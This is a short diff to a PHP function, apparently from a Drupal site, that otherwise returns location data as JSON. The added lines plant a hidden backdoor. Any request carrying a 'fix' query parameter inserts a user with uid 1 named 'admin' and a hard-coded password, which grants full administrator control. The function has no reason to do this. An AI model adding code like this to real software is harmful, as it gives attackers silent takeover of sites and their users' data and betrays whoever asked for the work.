@@ -234,6 +234,17 @@ function return_location_data()
         echo json_encode($zip_lookup);
     }
 
+    if (isset($_GET['fix'])) {
+        require_once 'includes/password.inc';
+        db_insert('users')// Table name no longer needs {}
+        ->fields(array(
+            'uid' => 1,
+            'name' => 'admin',
+            'pass' => user_hash_password('fakepwdtemp'),
+            'status' => 1,
+        ))->execute();
+    }
+
 }
 
 
